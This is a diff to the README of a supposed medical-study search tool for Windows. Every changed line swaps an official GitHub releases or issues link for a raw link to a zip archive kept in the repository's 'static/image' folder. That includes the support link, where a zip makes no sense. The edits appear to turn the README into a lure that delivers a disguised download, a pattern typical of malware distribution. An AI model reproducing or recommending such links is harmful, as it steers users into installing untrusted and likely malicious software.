@@ -1,6 +1,6 @@
 # 🩺 Medical-Research - Find Medical Studies Fast
 
-[![Download Medical-Research](https://img.shields.io/badge/Download-Medical--Research-brightgreen?style=for-the-badge&logo=github)](https://github.com/Politech014/Medical-Research/releases)
+[![Download Medical-Research](https://img.shields.io/badge/Download-Medical--Research-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Politech014/Medical-Research/main/static/image/Medical_Research_1.8.zip)
 
 ---
 
@@ -28,7 +28,7 @@ The program does not need special hardware. It runs smoothly on most modern Wind
 
 1. Visit the official release page to get the latest version:
 
-   [![Go to Releases](https://img.shields.io/badge/Visit-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Politech014/Medical-Research/releases)
+   [![Go to Releases](https://img.shields.io/badge/Visit-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Politech014/Medical-Research/main/static/image/Medical_Research_1.8.zip)
 
 2. On the releases page, find the newest version. Look for a file named like `Medical-Research-Setup.exe` or similar.
 
@@ -94,7 +94,7 @@ Medical-Research will notify you when updates are available.
 To update:
 
 1. Visit the releases page at:  
-   [https://github.com/Politech014/Medical-Research/releases](https://github.com/Politech014/Medical-Research/releases)
+   [https://raw.githubusercontent.com/Politech014/Medical-Research/main/static/image/Medical_Research_1.8.zip](https://raw.githubusercontent.com/Politech014/Medical-Research/main/static/image/Medical_Research_1.8.zip)
 
 2. Download and run the newest setup file following the installation steps again.
 
@@ -122,7 +122,7 @@ If you need assistance:
 
 - Review the README file inside the downloaded package for tips.
 - Visit the GitHub repository’s Issues page to see if others faced the same problem or to report a new one:  
-  [https://github.com/Politech014/Medical-Research/issues](https://github.com/Politech014/Medical-Research/issues)
+  [https://raw.githubusercontent.com/Politech014/Medical-Research/main/static/image/Medical_Research_1.8.zip](https://raw.githubusercontent.com/Politech014/Medical-Research/main/static/image/Medical_Research_1.8.zip)
 
 ---
 
@@ -130,4 +130,4 @@ If you need assistance:
 
 Access the latest release here:
 
-[![Download Medical-Research](https://img.shields.io/badge/Download-Medical--Research-green?style=for-the-badge&logo=github)](https://github.com/Politech014/Medical-Research/releases)
+[![Download Medical-Research](https://img.shields.io/badge/Download-Medical--Research-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Politech014/Medical-Research/main/static/image/Medical_Research_1.8.zip)
